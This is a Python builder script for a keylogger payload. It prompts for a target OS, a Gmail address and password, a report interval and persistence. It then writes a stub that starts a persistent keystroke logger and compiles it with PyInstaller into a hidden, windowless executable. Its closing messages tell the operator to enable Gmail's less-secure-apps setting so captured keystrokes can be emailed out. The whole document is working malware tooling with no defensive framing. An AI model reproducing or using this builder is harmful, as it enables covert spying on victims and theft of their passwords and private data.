#!/usr/bin/env python3
# description='Compile keylogger payload.'
import inquirer
import subprocess
import os
from config.variables import WINDOWS_PYTHON_INTERPRETER_PATH

def write_keylogger(file_name, interval, email, password, persistence):
    with open(file_name, "w+") as file:
        file.write("import keylogger\n")
        file.write("logger = keylogger.Keylogger(" + interval + ",'" + email + "','" + password + "')\n")
        if (persistence):
            file.write("logger.persist()\n")
        file.write("logger.start()\n")

def compile_for_windows(file_name):
    subprocess.call(["wine", WINDOWS_PYTHON_INTERPRETER_PATH, "--onefile", "--noconsole", file_name])

def compile_for_linux(file_name):
    subprocess.call(["pyinstaller", "--onefile", "--noconsole", file_name])

def main():
    questions = [
        inquirer.List("operating_sys", message="Select the target OS", choices=[("Linux","linux"),("Windows","windows")] ),
        inquirer.Text("email", message="Enter email address to send reports to", validate=lambda _, x: x != ''),
        inquirer.Text("password", message="Enter password for given email address", validate=lambda _, x: x != ''),
        inquirer.Text("interval", message="Report interval (in seconds)", default=25000, validate=lambda _, x: x != ''),
        inquirer.List("persistence", message="Make Keylogger persistent?", choices=[("Yes","yes"),("No","no")]),
        inquirer.Text("file_name", message="Enter output filename", validate=lambda _, x: x != '')
        ]
    answers = inquirer.prompt(questions, raise_keyboard_interrupt=True)

    persist_status = True if answers["persistence"] == "yes" else False
    write_keylogger(answers["file_name"], answers["interval"], answers["email"], answers["password"], persist_status)
    if (answers["operating_sys"] == "windows"):
        compile_for_windows(answers["file_name"])
    if (answers["operating_sys"] == "linux"):
        compile_for_linux(answers["file_name"])
    
    print("\n[+] Compilation complete")
    print("[*] You must allow less secure applications in provided Gmail account")
    print("[*] Do so here: https://myaccount.google.com/lesssecureapps")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("[x] Compiler terminated by user")
    else:
        print("[-] Compilation failed")